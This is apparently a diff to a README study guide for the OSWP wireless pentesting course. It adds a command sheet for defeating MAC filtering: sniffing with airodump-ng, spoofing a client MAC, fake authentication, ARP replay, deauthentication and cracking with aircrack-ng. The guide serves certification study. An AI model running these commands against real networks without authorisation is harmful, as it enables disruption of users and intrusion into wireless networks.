@@ -1,6 +1,38 @@
 # OSWP-Study-Guide
 Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)
 
+## Open Network with MAC filtering
+In the event that fake authentication persistently fails, it is plausible that MAC address filtering is being employed. Under such a scheme, the Access Point (AP) will only permit connections from a predefined list of MAC addresses. Should this be the scenario, it will be necessary to acquire a legitimate MAC address by monitoring network traffic with the aid of Airodump-ng. Subsequently, impersonation of this MAC address should be carried out once the corresponding client has disconnected from the network. It is imperative to refrain from initiating a fake authentication attack targeting a specific MAC address if the client remains active on the AP.
+
+### Packet capture
+```bash
+airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
+```
+### Get your MAC address
+```bash
+macchanger --show <INTERFACE>
+```
+
+### Fake authentication attack
+```bash
+aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
+```
+
+### ARP replay attack
+```bash
+aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>
+```
+
+### Deauthentication attack
+```bash
+aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
+```
+
+### Crack 
+```bash
+aircrack-ng <CAPTURE_NAME>
+```
+
 ## WEP (Wired Equivalent Privacy)
 WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:
 
@@ -119,6 +151,10 @@ Information discovery example:
 ```bash
 sudo airmon-ng
 ```
+- To restart Network Manager, execute command:
+```bash
+systemctl restart NetworkManager.service
+```  
 
 ## Sources
 [LIODEUS OSWP Cheatsheet](https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html)
